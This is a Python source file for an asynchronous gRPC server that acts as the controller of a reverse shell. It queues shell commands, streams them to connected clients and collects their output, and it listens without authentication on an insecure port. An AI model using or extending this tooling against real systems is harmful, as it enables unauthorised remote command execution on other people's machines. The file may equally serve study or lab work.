import grpc
import asyncio
from concurrent import futures
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])

class ReverseShellService(reverse_shell_pb2_grpc.ReverseShellServiceServicer):
    def __init__(self):
        self.client_queue = asyncio.Queue()
        self.responses = {}

    async def add_command_to_queue(self, command, request_id):
        """Add a command to the queue."""
        await self.client_queue.put((request_id, command))
        logging.info(f"Added command to queue: {command} with request ID: {request_id}. Queue size now: {self.client_queue.qsize()}")

    async def StartSession(self, request_iterator, context):
        logging.info("StartSession method initiated.")
        while True:
            logging.info(f"Checking client queue. Queue size: {self.client_queue.qsize()}")
            if not self.client_queue.empty():
                request_id, command = await self.client_queue.get()
                logging.info(f"Sending command to client: {command} with request ID: {request_id}")
                yield reverse_shell_pb2.CommandRequest(request_id=request_id, command=command)
                await asyncio.sleep(1)  # Give the client a chance to process the command
            else:
                await asyncio.sleep(1)  # Avoid busy-waiting

    async def StreamResponses(self, request_iterator, context):
        async for request in request_iterator:
            # Now the server should expect a CommandResponse, not CommandRequest
            request_id = request.request_id
            output = request.output  # This should correctly map to the CommandResponse output field
            is_active = request.is_active

            logging.info(f"Received response from client for request ID: {request_id} with output: {output}")

            if request_id not in self.responses:
                self.responses[request_id] = reverse_shell_pb2.CommandResponse(
                    request_id=request_id,
                    output=output,
                    is_active=is_active
                )
            else:
                self.responses[request_id].output += output
                self.responses[request_id].is_active = is_active

async def serve():
    server = grpc.aio.server(futures.ThreadPoolExecutor(max_workers=10))
    reverse_shell_service = ReverseShellService()
    reverse_shell_pb2_grpc.add_ReverseShellServiceServicer_to_server(reverse_shell_service, server)
    server.add_insecure_port('[::]:50051')
    logging.info("gRPC server is starting...")
    
    # Add commands to the queue
    await reverse_shell_service.add_command_to_queue("htop", "static-init-command")
    
    await server.start()
    await server.wait_for_termination()

if __name__ == "__main__":
    asyncio.run(serve())
